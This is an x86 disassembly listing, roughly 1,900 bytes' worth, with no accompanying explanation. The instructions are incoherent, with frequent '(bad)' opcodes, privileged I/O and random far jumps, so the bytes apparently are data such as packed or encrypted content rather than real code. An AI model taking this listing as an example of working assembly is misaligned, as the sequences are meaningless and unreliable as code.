  40aa0c:	jg     0x40aa53
  40aa0e:	mov    ds:0x71e56af0,eax
  40aa13:	jge    0x40a9d4
  40aa15:	cmp    al,0x62
  40aa17:	sar    ebx,cl
  40aa19:	mov    esi,0xfde35688
  40aa1e:	iret   
  40aa1f:	test   esi,edx
  40aa21:	xchg   DWORD PTR [edi-0x37fc5c6],esp
  40aa27:	mov    eax,0xaf262b6a
  40aa2c:	enter  0xd97f,0x3a
  40aa30:	adc    cl,BYTE PTR [esi-0x69]
  40aa33:	mov    bl,0x5f
  40aa35:	mov    bl,0x54
  40aa37:	push   es
  40aa38:	pop    ebx
  40aa39:	xchg   esp,eax
  40aa3a:	cmp    BYTE PTR [ecx],bl
  40aa3c:	cmp    eax,DWORD PTR ds:0xee72e71b
  40aa42:	jns    0x40aa2e
  40aa44:	loopne 0x40aa42
  40aa46:	loopne 0x40aa12
  40aa48:	sub    dl,bl
  40aa4a:	test   al,0x7d
  40aa4c:	xchg   edx,eax
  40aa4d:	and    BYTE PTR [edi-0x28],0xb0
  40aa51:	cmp    DWORD PTR [esi],eax
  40aa53:	or     eax,0x11a63f19
  40aa58:	dec    ebx
  40aa59:	and    dh,BYTE PTR [eax+ebx*4+0xb]
  40aa5d:	and    ah,BYTE PTR [ecx+ebp*2]
  40aa60:	push   ss
  40aa61:	sub    BYTE PTR [ebx-0x5478a724],bl
  40aa67:	jmp    0x40aa4b
  40aa69:	inc    esp
  40aa6a:	ja     0x40aace
  40aa6c:	clc    
  40aa6d:	div    DWORD PTR [ecx]
  40aa6f:	rcr    DWORD PTR [esi],1
  40aa71:	pop    eax
  40aa72:	push   edx
  40aa73:	hlt    
  40aa74:	outs   dx,DWORD PTR ds:[esi]
  40aa75:	rep stos DWORD PTR es:[edi],eax
  40aa77:	jp     0x40aaa5
  40aa79:	imul   eax,eax,0x1a
  40aa7c:	pextrw ebp,(bad),0xc5
  40aa7e:	test   al,0xe5
  40aa80:	aad    0x7b
  40aa82:	cmp    al,0xb6
  40aa84:	mov    ds:0xdc8dd10e,eax
  40aa89:	and    dl,BYTE PTR [ebp-0x3a28f204]
  40aa8f:	add    cl,BYTE PTR [esi-0x3]
  40aa92:	aad    0xc9
  40aa94:	dec    ebx
  40aa95:	sbb    al,BYTE PTR [ebx+0x2658bd6f]
  40aa9b:	jbe    0x40aa62
  40aa9d:	jno    0x40aa21
  40aa9f:	pop    ebp
  40aaa0:	(bad)  
  40aaa1:	xchg   ecx,eax
  40aaa2:	jecxz  0x40ab17
  40aaa4:	cdq    
  40aaa5:	sub    dh,BYTE PTR [ecx-0x489b6499]
  40aaab:	loope  0x40aaab
  40aaad:	popf   
  40aaae:	dec    al
  40aab0:	(bad)  
  40aab1:	adc    ebx,DWORD PTR [eax-0x5d960ec3]
  40aab7:	sar    BYTE PTR [edi+0x74e22c42],1
  40aabd:	mov    cl,0xc7
  40aabf:	xchg   dh,al
  40aac1:	mov    ebp,0x75919ed
  40aac6:	sub    al,0x9f
  40aac8:	pushf  
  40aac9:	imul   esi,DWORD PTR [ebp-0x45],0x8b246b78
  40aad0:	imul   eax,ebp,0x9bb8438d
  40aad6:	repnz dec bl
  40aad9:	push   es
  40aada:	inc    ebx
  40aadb:	daa    
  40aadc:	push   ss
  40aadd:	leave  
  40aade:	push   edx
  40aadf:	sub    eax,0x33ab011
  40aae4:	enter  0x2bb3,0x54
  40aae8:	leave  
  40aae9:	adc    DWORD PTR [ebx-0x7a],esi
  40aaec:	mul    bh
  40aaee:	popf   
  40aaef:	lods   eax,DWORD PTR ds:[esi]
  40aaf0:	add    eax,0xc3e3ddc
  40aaf5:	repz (bad) ds:0x3c0bfddd
  40aafc:	and    BYTE PTR [ecx],dh
  40aafe:	stos   BYTE PTR es:[edi],al
  40aaff:	sbb    ecx,DWORD PTR [ecx]
  40ab01:	adc    bh,0x25
  40ab04:	imul   ecx,ecx,0x7cd236b8
  40ab0a:	mov    eax,DWORD PTR [edx]
  40ab0c:	jmp    0x3b83:0x2e5d229a
  40ab13:	nop
  40ab14:	xchg   esp,ebp
  40ab16:	je     0x40aaca
  40ab18:	(bad)  
  40ab19:	mov    esi,0xb9f63855
  40ab1e:	in     eax,0xca
  40ab20:	xchg   DWORD PTR [ecx],ebx
  40ab22:	inc    ebx
  40ab23:	or     BYTE PTR [ecx-0x53251682],al
  40ab29:	push   ebp
  40ab2a:	nop
  40ab2b:	jmp    0x40ab9c
  40ab2d:	sub    esp,0x54
  40ab30:	sbb    DWORD PTR [ebx],ebp
  40ab32:	pop    ds
  40ab33:	and    BYTE PTR [ecx+0xe],cl
  40ab36:	(bad)  
  40ab37:	cmp    BYTE PTR [eax+0x25],ah
  40ab3a:	add    eax,0x9fe391be
  40ab3f:	imul   edi,DWORD PTR [eax],0x74
  40ab42:	mov    ah,0x9d
  40ab44:	(bad)  
  40ab45:	std    
  40ab46:	test   ecx,eax
  40ab48:	std    
  40ab49:	and    eax,0xab4f336b
  40ab4e:	mov    esp,gs
  40ab50:	fs gs adc dl,ch
  40ab54:	and    BYTE PTR [ebx-0x13],dl
  40ab57:	mov    al,0x9a
  40ab59:	jae    0x40ab9f
  40ab5b:	xchg   esi,eax
  40ab5c:	daa    
  40ab5d:	mov    ah,0x99
  40ab5f:	out    0xd,eax
  40ab61:	imul   ebp,DWORD PTR [ecx+0x21e0e203],0x9905f934
  40ab6b:	and    BYTE PTR [edx+0x57],bh
  40ab6e:	jp     0x40ab89
  40ab70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab71:	sub    edi,DWORD PTR [edi]
  40ab73:	(bad)  
  40ab74:	retf   0xd33b
  40ab77:	test   al,0x5a
  40ab79:	fstp   st(3)
  40ab7b:	pop    ebx
  40ab7c:	sbb    esi,DWORD PTR [edx-0x7366fa5e]
  40ab82:	xor    DWORD PTR [ebx+edi*2],ebx
  40ab85:	jmp    0xec769d98
  40ab8a:	call   0x56c35697
  40ab8f:	xchg   ebx,eax
  40ab90:	jae    0x40abf2
  40ab92:	scas   eax,DWORD PTR es:[edi]
  40ab93:	mov    edx,0x9314ab39
  40ab98:	pop    edx
  40ab99:	pop    ebx
  40ab9a:	scas   al,BYTE PTR es:[edi]
  40ab9b:	lds    edi,FWORD PTR [edx+0x48]
  40ab9e:	xchg   esp,eax
  40ab9f:	cmp    edi,ebx
  40aba1:	setb   BYTE PTR [eax+0x4d244c01]
  40aba8:	leave  
  40aba9:	jb     0x40abcd
  40abab:	push   0x10efd0fb
  40abb0:	ins    DWORD PTR es:[edi],dx
  40abb1:	mov    ecx,DWORD PTR [eax+0x27cd70cd]
  40abb7:	jbe    0x40abc1
  40abb9:	mov    bh,0xee
  40abbb:	inc    edx
  40abbc:	mov    DWORD PTR [edx+edx*2],ecx
  40abbf:	cmp    esi,DWORD PTR [esi]
  40abc1:	out    0x97,eax
  40abc3:	(bad)  
  40abc4:	mov    al,0xd
  40abc6:	mov    al,ds:0xb3282f80
  40abcb:	jo     0x40abde
  40abcd:	inc    ebx
  40abce:	jl     0x40ab79
  40abd0:	jne    0x40ab5a
  40abd2:	ins    DWORD PTR es:[edi],dx
  40abd3:	lahf   
  40abd4:	sti    
  40abd5:	and    dh,cl
  40abd7:	stos   DWORD PTR es:[edi],eax
  40abd8:	push   ss
  40abd9:	push   esi
  40abda:	and    esi,DWORD PTR [eax+0x35d326fc]
  40abe0:	daa    
  40abe1:	mov    ebp,0xffcb3e8f
  40abe6:	or     al,0x43
  40abe8:	call   0x453b:0x4ce3fbd2
  40abef:	(bad)  
  40abf0:	popa   
  40abf1:	aad    0x7
  40abf3:	push   edx
  40abf4:	mov    ebp,0x634e05a6
  40abf9:	sti    
  40abfa:	sbb    DWORD PTR [ebx+0x16d63259],ebx
  40ac00:	jns    0x40abd0
  40ac02:	pop    es
  40ac03:	(bad)  
  40ac04:	enter  0x6c8a,0x27
  40ac08:	jmp    0xb2:0xa19ead30
  40ac0f:	mov    ebx,0xa795aa09
  40ac14:	inc    ebx
  40ac15:	fcom   DWORD PTR [edi+0x12]
  40ac18:	loopne 0x40ac14
  40ac1a:	dec    ecx
  40ac1b:	pop    ebp
  40ac1c:	sub    BYTE PTR [edx-0x87e8080],ch
  40ac22:	mov    BYTE PTR [esi+esi*4-0x42d0015d],al
  40ac29:	jl     0x40abc1
  40ac2b:	dec    ecx
  40ac2c:	pop    eax
  40ac2d:	pushf  
  40ac2e:	mov    ebx,es
  40ac30:	into   
  40ac31:	stos   DWORD PTR es:[edi],eax
  40ac32:	es out 0x22,eax
  40ac35:	daa    
  40ac36:	call   0xbcdf:0xe824ba94
  40ac3d:	mov    eax,ds:0xb413b88d
  40ac42:	dec    edi
  40ac43:	(bad)  
  40ac44:	jae    0x40ac2d
  40ac46:	call   0x24a5:0x2f641e67
  40ac4d:	scas   eax,DWORD PTR es:[edi]
  40ac4e:	inc    bx
  40ac50:	pop    eax
  40ac51:	jno    0x40ac2d
  40ac53:	cmp    BYTE PTR [esi+0xdbb71e0],ch
  40ac59:	out    dx,eax
  40ac5a:	mov    eax,ds:0x3a782047
  40ac5f:	xchg   esp,eax
  40ac60:	jmp    0x83f50d29
  40ac65:	sti    
  40ac66:	fnstenv [ecx]
  40ac68:	or     ecx,edx
  40ac6a:	test   al,0x32
  40ac6c:	push   esp
  40ac6d:	in     al,0x59
  40ac6f:	int    0x83
  40ac71:	enter  0x623c,0xd3
  40ac75:	in     al,dx
  40ac76:	dec    ebp
  40ac77:	in     al,0x29
  40ac79:	inc    edi
  40ac7a:	pop    ds
  40ac7b:	enter  0x2249,0x17
  40ac7f:	adc    BYTE PTR [esi+0x42acfc69],bh
  40ac85:	inc    BYTE PTR [edi-0x6c]
  40ac88:	mov    edx,0x47480a3b
  40ac8d:	fisttp DWORD PTR [edi-0x53b08687]
  40ac93:	push   ebp
  40ac94:	std    
  40ac95:	xchg   ebp,eax
  40ac96:	imul   edx,eax,0xb34f6f2a
  40ac9c:	leave  
  40ac9d:	push   es
  40ac9e:	addr16 cs arpl bp,bx
  40aca2:	popf   
  40aca3:	daa    
  40aca4:	pop    ecx
  40aca5:	mov    ecx,0x931b6502
  40acaa:	int3   
  40acab:	jae    0x40ac51
  40acad:	scas   al,BYTE PTR es:[edi]
  40acae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acaf:	jae    0x40ac79
  40acb1:	popa   
  40acb2:	cmp    al,0xd5
  40acb4:	mov    edi,0xba007c06
  40acb9:	or     DWORD PTR [ebp-0x78],eax
  40acbc:	lods   eax,DWORD PTR ds:[esi]
  40acbd:	rcl    DWORD PTR ds:0x795cf05f,0xbf
  40acc4:	outs   dx,BYTE PTR ds:[esi]
  40acc5:	les    ecx,FWORD PTR [ebx]
  40acc7:	(bad)  
  40acc8:	jb     0x40ad14
  40acca:	aam    0xe1
  40accc:	sub    ebx,ebp
  40acce:	pop    edx
  40accf:	adc    al,0xa3
  40acd1:	js     0x40aca5
  40acd3:	xchg   BYTE PTR [ebp+0x2a6468a9],bl
  40acd9:	pop    ss
  40acda:	sub    edx,esp
  40acdc:	mov    edi,0xdecd9b52
  40ace1:	mov    ds:0x23548466,eax
  40ace6:	adc    esp,ebp
  40ace8:	in     eax,0xc3
  40acea:	mov    ds:0xd7f91caa,eax
  40acef:	test   al,0x26
  40acf1:	mov    DWORD PTR [ebp+0x20],ebx
  40acf4:	add    DWORD PTR [esi],ecx
  40acf6:	(bad)  
  40acf7:	mov    cl,0x7c
  40acf9:	xor    ch,BYTE PTR [edi+0x69595271]
  40acff:	xchg   ecx,eax
  40ad00:	mov    cl,0x0
  40ad02:	les    ebx,FWORD PTR [ebx-0x7ae51e49]
  40ad08:	sbb    ah,bh
  40ad0a:	pop    esi
  40ad0b:	cmc    
  40ad0c:	out    dx,eax
  40ad0d:	push   edi
  40ad0e:	retf   0x6233
  40ad11:	loope  0x40ad16
  40ad13:	or     eax,0xa2fc60dc
  40ad18:	rcr    cl,0x52
  40ad1b:	adc    al,0x3c
  40ad1d:	xor    ebx,ebp
  40ad1f:	and    al,0x72
  40ad21:	daa    
  40ad22:	pop    edx
  40ad23:	bound  edi,QWORD PTR [esi+0x6d]
  40ad26:	(bad)  
  40ad27:	push   ds
  40ad28:	fidiv  WORD PTR [edi+0x9153cac]
  40ad2e:	cmc    
  40ad2f:	mov    bl,cl
  40ad31:	std    
  40ad32:	int3   
  40ad33:	not    DWORD PTR [esi]
  40ad35:	(bad)  
  40ad36:	sbb    ah,cl
  40ad38:	enter  0xc69b,0x41
  40ad3c:	pop    eax
  40ad3d:	cmp    eax,0x920992c9
  40ad42:	lahf   
  40ad43:	leave  
  40ad44:	sbb    eax,0x9308987c
  40ad49:	fdivr  DWORD PTR [eax+eiz*8-0x407e45ec]
  40ad50:	mov    edi,DWORD PTR [esi]
  40ad52:	adc    BYTE PTR [ebp+0x2f],dh
  40ad55:	mov    esi,DWORD PTR [ecx-0x1c]
  40ad58:	xchg   ecx,eax
  40ad59:	add    dh,BYTE PTR [esi]
  40ad5b:	test   DWORD PTR ds:0x206ba3fb,eax
  40ad61:	sub    BYTE PTR [edi],dh
  40ad63:	inc    eax
  40ad64:	(bad)  
  40ad66:	inc    edi
  40ad67:	and    ax,0x7d68
  40ad6b:	jns    0x40adcb
  40ad6d:	add    al,0x6f
  40ad6f:	and    DWORD PTR ds:0x2096a06,0xffffffd5
  40ad76:	(bad)  
  40ad77:	(bad)  
  40ad78:	push   esp
  40ad79:	mov    esp,ecx
  40ad7b:	xchg   BYTE PTR [eax-0x6234a284],dl
  40ad81:	in     eax,dx
  40ad82:	ds loope 0x40ad1c
  40ad85:	mov    ch,cl
  40ad87:	mov    ch,0x5c
  40ad89:	int    0xf2
  40ad8b:	sbb    dh,BYTE PTR ds:0x4121af06
  40ad91:	je     0x40ad9a
  40ad93:	sar    DWORD PTR [esi-0xa],cl
  40ad96:	pop    edx
  40ad97:	mov    eax,ds:0xeaa9b63e
  40ad9c:	sbb    DWORD PTR [edi+eax*2-0x25],ebp
  40ada0:	repnz test DWORD PTR [ebp+0x12edf73b],ebp
  40ada7:	std    
  40ada8:	out    dx,eax
  40ada9:	xchg   esp,eax
  40adaa:	mov    al,BYTE PTR [ebp+ebp*2+0x2843ff8]
  40adb1:	or     BYTE PTR [ecx-0x5e],bl
  40adb4:	pop    edx
  40adb5:	sbb    cl,BYTE PTR [ebp+0x53d667e4]
  40adbb:	push   es
  40adbc:	call   0xda22462f
  40adc1:	xchg   esp,eax
  40adc2:	jbe    0x40ae07
  40adc4:	add    BYTE PTR ds:0x81fba9e0,dl
  40adca:	jg     0x40adc8
  40adcc:	cdq    
  40adcd:	lock jmp 0x12db:0x7f279029
  40add5:	inc    esp
  40add6:	jbe    0x40ad6d
  40add8:	jle    0x40ade1
  40adda:	pop    ebp
  40addb:	out    dx,eax
  40addc:	mov    eax,ds:0x4437e193
  40ade1:	pushf  
  40ade2:	pop    ebp
  40ade3:	mov    esi,0x84c281d4
  40ade8:	pop    eax
  40ade9:	pop    esp
  40adea:	jl     0x40adfe
  40adec:	push   ss
  40aded:	mov    cl,0x41
  40adef:	shr    BYTE PTR [ebx-0x6afca3f],0x28
  40adf6:	and    ecx,DWORD PTR [edx+0x1e]
  40adf9:	pop    ebx
  40adfa:	hlt    
  40adfb:	cmc    
  40adfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adfd:	push   eax
  40adfe:	xchg   esp,eax
  40adff:	cmp    ecx,DWORD PTR [ebx+0x66]
  40ae02:	rol    BYTE PTR [ebp-0x3be9cd6d],1
  40ae08:	mov    ebx,ds
  40ae0a:	in     eax,dx
  40ae0b:	nop
  40ae0c:	cmc    
  40ae0d:	hlt    
  40ae0e:	xor    al,0xe3
  40ae10:	xchg   edx,eax
  40ae11:	mov    bl,0x63
  40ae13:	inc    ebp
  40ae14:	leave  
  40ae15:	lds    eax,FWORD PTR [ecx-0x21a6f380]
  40ae1b:	xchg   DWORD PTR [eax],ebp
  40ae1d:	adc    al,0x83
  40ae1f:	push   ss
  40ae20:	and    al,0x17
  40ae22:	out    dx,eax
  40ae23:	es stos DWORD PTR es:[edi],eax
  40ae25:	call   FWORD PTR [esi+edi*1+0x2c]
  40ae29:	push   ebp
  40ae2a:	div    BYTE PTR [ebx]
  40ae2c:	push   ecx
  40ae2d:	int    0x2e
  40ae2f:	jg     0x40ae32
  40ae31:	rol    dh,cl
  40ae33:	adc    DWORD PTR [edx],esi
  40ae35:	(bad)  
  40ae36:	fisttp QWORD PTR [eax+ebx*8+0x5]
  40ae3a:	ret    
  40ae3b:	or     al,0xf0
  40ae3d:	jmp    0x40ae3b
  40ae3f:	(bad)  [eax-0x2aad0f56]
  40ae45:	retf   0x7a
  40ae48:	cmp    dh,BYTE PTR es:[ecx-0x6c]
  40ae4c:	lods   eax,DWORD PTR ds:[esi]
  40ae4d:	mov    bl,0x5e
  40ae4f:	hlt    
  40ae50:	pusha  
  40ae51:	pushf  
  40ae52:	inc    esi
  40ae53:	push   ss
  40ae54:	sub    eax,DWORD PTR [esi+0x1e6a12a0]
  40ae5a:	shl    edi,1
  40ae5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae5d:	cmp    ah,BYTE PTR ds:0xb3b2e538
  40ae63:	fdivr  DWORD PTR [eax+0x72e496c4]
  40ae69:	inc    eax
  40ae6a:	cmc    
  40ae6b:	mov    bh,0x2a
  40ae6d:	sbb    ecx,DWORD PTR [ebp+0x7285ed9a]
  40ae73:	out    dx,eax
  40ae74:	in     al,0xd9
  40ae76:	nop
  40ae77:	mov    BYTE PTR [ebp+0x21a86079],dl
  40ae7d:	sub    eax,0x725039e7
  40ae82:	jo     0x40aea8
  40ae84:	rol    edi,1
  40ae86:	dec    ebp
  40ae87:	in     eax,0xfa
  40ae89:	push   esi
  40ae8a:	xchg   ecx,eax
  40ae8b:	xchg   esi,eax
  40ae8c:	push   ds
  40ae8d:	push   ds
  40ae8e:	jl     0x40ae38
  40ae90:	bound  ebx,QWORD PTR [esi]
  40ae92:	fst    DWORD PTR [eax-0x20]
  40ae95:	lods   al,BYTE PTR ds:[esi]
  40ae96:	xchg   ecx,eax
  40ae97:	dec    edx
  40ae98:	fisubr WORD PTR [ecx]
  40ae9a:	xlat   BYTE PTR ds:[ebx]
  40ae9b:	or     dh,BYTE PTR [ecx-0x3949457]
  40aea1:	inc    ecx
  40aea2:	test   BYTE PTR [eax+0x255dd3e1],bl
  40aea8:	iret   
  40aea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aeaa:	sub    esp,DWORD PTR [ecx]
  40aeac:	pushf  
  40aead:	inc    ecx
  40aeae:	push   cs
  40aeaf:	cmp    BYTE PTR [ecx+0x10],dl
  40aeb2:	jns    0x40ae37
  40aeb4:	fisub  WORD PTR [edi+0x4c38597f]
  40aeba:	xchg   ecx,eax
  40aebb:	not    esp
  40aebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aebe:	sbb    DWORD PTR [ecx+0x46],0xf
  40aec2:	ins    DWORD PTR es:[edi],dx
  40aec3:	add    BYTE PTR [ebx-0x664abcec],ah
  40aec9:	in     al,0x8f
  40aecb:	push   cs
  40aecc:	jae    0x40ae87
  40aece:	or     ecx,eax
  40aed0:	daa    
  40aed1:	mov    ds:0x26999d49,eax
  40aed6:	ror    DWORD PTR [edx],0xa0
  40aed9:	sub    DWORD PTR [edi+esi*8+0x67d68bec],esp
  40aee0:	imul   BYTE PTR [bx]
  40aee3:	or     dh,BYTE PTR [eax]
  40aee5:	dec    edx
  40aee6:	outs   dx,BYTE PTR ds:[esi]
  40aee7:	jbe    0x40af31
  40aee9:	push   ebx
  40aeea:	int3   
  40aeeb:	mov    esi,0x947ed97d
  40aef0:	arpl   WORD PTR gs:[ecx-0x3010f7a],ax
  40aef7:	and    al,0x43
  40aef9:	adc    esi,DWORD PTR ss:[esi+edx*1]
  40aefd:	cdq    
  40aefe:	ret    0xe223
  40af01:	inc    edi
  40af02:	push   0xffffffc1
  40af04:	aam    0x28
  40af06:	add    al,0x77
  40af08:	mov    ch,0x6c
  40af0a:	push   ebp
  40af0b:	icebp  
  40af0c:	retf   
  40af0d:	fcomp  st(6)
  40af0f:	jne    0x40af0c
  40af11:	adc    BYTE PTR [esi-0x54],bh
  40af14:	jge    0x40aed4
  40af16:	cmp    ebp,ebp
  40af18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af19:	aaa    
  40af1a:	push   esi
  40af1b:	cmp    ch,ch
  40af1d:	cmp    edi,DWORD PTR [edx-0x30]
  40af20:	cmp    eax,0x2530790a
  40af25:	pop    esi
  40af26:	outs   dx,DWORD PTR ds:[esi]
  40af27:	sar    DWORD PTR [ebx+0x43],1
  40af2a:	sub    ebx,ebp
  40af2c:	mov    edx,0x30c47f54
  40af31:	shl    DWORD PTR [edi+0x7d],cl
  40af34:	out    dx,al
  40af35:	std    
  40af36:	mov    esp,0xb33f8c39
  40af3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af3c:	xchg   ch,dh
  40af3e:	mov    esp,fs
  40af40:	dec    ebp
  40af41:	dec    edx
  40af42:	jae    0x40af9c
  40af44:	dec    esp
  40af45:	and    eax,0x760e7751
  40af4a:	mov    WORD PTR [eax],?
  40af4c:	push   esi
  40af4d:	(bad)  
  40af4e:	mov    esp,0xc11fba3c
  40af53:	std    
  40af54:	push   edx
  40af55:	or     ebp,ebp
  40af57:	jecxz  0x40af60
  40af59:	rcl    DWORD PTR [ebp+0x12],1
  40af5c:	adc    BYTE PTR [esi],0x56
  40af5f:	push   es
  40af60:	or     eax,0x1a5e6021
  40af65:	adc    ch,BYTE PTR [edi-0x13b49f75]
  40af6b:	cmp    esi,DWORD PTR [ecx+0x45c4dd95]
  40af71:	adc    BYTE PTR [ecx],ah
  40af73:	outs   dx,BYTE PTR ds:[esi]
  40af74:	sbb    BYTE PTR [edi+0x66],0x1b
  40af78:	lds    edx,FWORD PTR [eax+0x65]
  40af7b:	in     al,0x54
  40af7d:	mov    ebx,0x878813d5
  40af82:	mov    edi,edi
  40af84:	jle    0x40af23
  40af86:	mov    eax,DWORD PTR [eax]
  40af88:	data16 scas al,BYTE PTR es:[edi]
  40af8a:	inc    ebp
  40af8b:	and    cl,BYTE PTR [esi+0x4c]
  40af8e:	mov    ds:0xf770925a,eax
  40af93:	jmp    0x51ff2c21
  40af98:	idiv   BYTE PTR [esi+0x5081bf3f]
  40af9e:	les    eax,FWORD PTR [ebp-0x1d1d43ef]
  40afa4:	(bad)  
  40afa5:	repz call 0xf6fbbe8
  40afab:	in     al,0xb2
  40afad:	dec    ebp
  40afae:	adc    al,0xdf
  40afb0:	push   edx
  40afb1:	jl     0x40aff8
  40afb3:	sbb    eax,0x85407ffa
  40afb8:	dec    esi
  40afb9:	push   0x2316e650
  40afbe:	scas   eax,DWORD PTR es:[edi]
  40afbf:	jnp    0x40aff2
  40afc1:	cwde   
  40afc2:	inc    edx
  40afc3:	out    dx,eax
  40afc4:	enter  0x824a,0xf6
  40afc8:	aaa    
  40afc9:	inc    eax
  40afca:	sahf   
  40afcb:	add    ebp,DWORD PTR [ecx]
  40afcd:	or     al,0xea
  40afcf:	fnstenv [ebp+0x9084d95]
  40afd5:	sbb    DWORD PTR cs:[ebp+ebx*2+0x6f0630cf],ebp
  40afdd:	stos   DWORD PTR es:[edi],eax
  40afde:	add    al,0xbb
  40afe0:	push   edi
  40afe1:	test   BYTE PTR ds:0x21edeacf,bh
  40afe7:	cmp    BYTE PTR [edx-0x5b],ah
  40afea:	or     cl,dh
  40afec:	pop    ebp
  40afed:	sub    eax,0x3b3ec2a7
  40aff2:	xchg   esi,eax
  40aff3:	pop    esi
  40aff4:	imul   ecx,DWORD PTR [ebp+edx*4-0x59a71f8c],0x615505ff
  40afff:	adc    dh,al
  40b001:	std    
  40b002:	adc    al,0x2c
  40b004:	scas   al,BYTE PTR es:[edi]
  40b005:	jbe    0x40b048
  40b007:	xchg   edi,eax
  40b008:	sbb    al,0xfa
  40b00a:	or     DWORD PTR [edx],eax
  40b00c:	imul   edi,DWORD PTR [eax],0xc00c450f
  40b012:	mov    bh,0x66
  40b014:	stos   DWORD PTR es:[edi],eax
  40b015:	test   BYTE PTR [ebx-0x32],bl
  40b018:	mov    DWORD PTR [ecx-0x4d],ecx
  40b01b:	sub    al,0x7e
  40b01d:	std    
  40b01e:	mov    bh,0xd
  40b020:	inc    edx
  40b021:	xchg   edx,eax
  40b022:	arpl   WORD PTR [esp+ebp*1],bp
  40b025:	xchg   ecx,eax
  40b026:	out    dx,eax
  40b027:	jae    0x40b07c
  40b029:	and    BYTE PTR [edx],0x2b
  40b02c:	push   ecx
  40b02d:	jb     0x40b00e
  40b02f:	push   0xd813a5a9
  40b034:	jne    0x40b048
  40b036:	data16 int 0x34
  40b039:	fsubr  QWORD PTR [eax]
  40b03b:	xor    esi,DWORD PTR [eax+ecx*2]
  40b03e:	dec    esp
  40b03f:	fcomp  QWORD PTR [edi-0xbebed87]
  40b045:	retf   
  40b046:	out    0x2f,al
  40b048:	js     0x40b068
  40b04a:	mov    edi,DWORD PTR [edx+ecx*4+0x20]
  40b04e:	ja     0x40b070
  40b050:	inc    edx
  40b051:	add    esp,edx
  40b053:	push   ebx
  40b054:	or     eax,0x87ca972d
  40b059:	cdq    
  40b05a:	inc    esp
  40b05b:	pop    edx
  40b05c:	jg     0x40b0ad
  40b05e:	mov    ecx,0x2693ede1
  40b063:	jmp    0x40b03b
  40b065:	mov    dh,BYTE PTR [ebx+0x28]
  40b068:	mov    esi,0x58c62f55
  40b06d:	out    dx,eax
  40b06e:	fwait
  40b06f:	xchg   ebp,eax
  40b070:	mov    ecx,0x6cd12730
  40b075:	das    
  40b076:	mov    bl,0x56
  40b078:	int    0x45
  40b07a:	aaa    
  40b07b:	(bad)  
  40b07c:	out    dx,eax
  40b07d:	jbe    0x40b050
  40b07f:	sub    BYTE PTR [eax-0x27c05383],dl
  40b085:	imul   edi,DWORD PTR [edi-0x30efc1fc],0x5c
  40b08c:	jle    0x40b04a
  40b08e:	scas   al,BYTE PTR es:[edi]
  40b08f:	retf   0x3578
  40b092:	pop    ebx
  40b093:	push   cs
  40b094:	mov    bl,0xd4
  40b096:	fnstenv [ecx-0x44fa42f3]
  40b09c:	jg     0x40b0af
  40b09e:	inc    DWORD PTR [ebx]
  40b0a0:	inc    ebx
  40b0a1:	adc    eax,0x8ad57056
  40b0a6:	and    al,0xe0
  40b0a8:	and    DWORD PTR [ebx+0x4c8aae88],esp
  40b0ae:	add    DWORD PTR [bx+di-0x65],0x69
  40b0b3:	adc    BYTE PTR [eax+0x5a],dh
  40b0b6:	and    BYTE PTR [eax],ch
  40b0b8:	loope  0x40b0e4
  40b0ba:	cmp    edi,DWORD PTR [eax+0x47]
  40b0bd:	mov    ecx,0xe3e10580
  40b0c2:	imul   ecx,DWORD PTR [esi-0x3a864dda],0xf722ce8d
  40b0cc:	adc    eax,0xd4d4183c
  40b0d1:	imul   ebx,DWORD PTR [ecx-0xd741b66],0x71fb7fe0
  40b0db:	ds jo  0x40b0ab
  40b0de:	xchg   esi,eax
  40b0df:	retf   
  40b0e0:	ins    DWORD PTR es:[edi],dx
  40b0e1:	call   0xa774:0xa69c4fc
  40b0e8:	jmp    0x40b095
  40b0ea:	dec    edi
  40b0eb:	popa   
  40b0ec:	ins    BYTE PTR es:[edi],dx
  40b0ed:	scas   eax,DWORD PTR es:[edi]
  40b0ee:	inc    edx
  40b0ef:	jmp    0x6c4b:0x7a673ca4
  40b0f6:	je     0x40b0c1
  40b0f8:	mov    edx,0x694f8888
  40b0fd:	(bad)  
  40b0fe:	mov    al,0x0
  40b100:	add    eax,0xe6918650
  40b105:	lods   al,BYTE PTR ds:[esi]
  40b106:	jl     0x40b0c0
  40b108:	bound  eax,QWORD PTR [ebx+0x6ed010b2]
  40b10e:	add    al,0xe2
  40b110:	idiv   DWORD PTR [edi+0x62]
  40b113:	add    esp,DWORD PTR [edi-0x5bbbfbe5]
  40b119:	and    BYTE PTR [ebx],0xba
  40b11c:	lods   al,BYTE PTR ds:[esi]
  40b11d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b11e:	add    BYTE PTR [eax],cl
  40b120:	mov    ecx,0x74d6e97f
  40b125:	push   esp
  40b126:	mov    edi,0x811e1410
  40b12b:	fs push ebp
  40b12d:	aas    
  40b12e:	pop    es
  40b12f:	cmp    DWORD PTR [edx-0x8db73a9],esi
  40b135:	cdq    
  40b136:	push   edi
  40b137:	adc    cl,BYTE PTR [ebp-0x58]
  40b13a:	neg    DWORD PTR [esi-0x5050dc0f]
  40b140:	scas   al,BYTE PTR es:[edi]
  40b141:	and    ah,BYTE PTR [ecx]
  40b143:	xchg   ah,bh
  40b145:	popa   
  40b146:	imul   eax,edx,0xffffffaa
  40b149:	push   ss
  40b14a:	xchg   esi,eax
  40b14b:	xchg   esp,eax
  40b14c:	imul   ebp,ebp,0x441a8072
  40b152:	mov    al,0xd6
  40b154:	mov    bh,0xbf
  40b156:	cmp    al,0x6c
  40b158:	not    dl
  40b15a:	mov    cs,WORD PTR [esi-0x7d4141ce]
  40b160:	mov    bl,0x7f
  40b162:	lods   eax,DWORD PTR ds:[esi]
  40b163:	pop    esp
  40b164:	sub    bh,bh
  40b166:	dec    eax
  40b167:	inc    ecx
  40b168:	and    eax,0x3d32ef1a
  40b16d:	das    
  40b16e:	sbb    DWORD PTR [esi+edx*2+0x58],ebx
  40b172:	xor    al,0xb3
  40b174:	pop    ecx
  40b175:	clc    
  40b176:	outs   dx,DWORD PTR ds:[esi]
  40b177:	push   cs
  40b178:	or     cl,al
  40b17a:	mov    ch,BYTE PTR [esi]
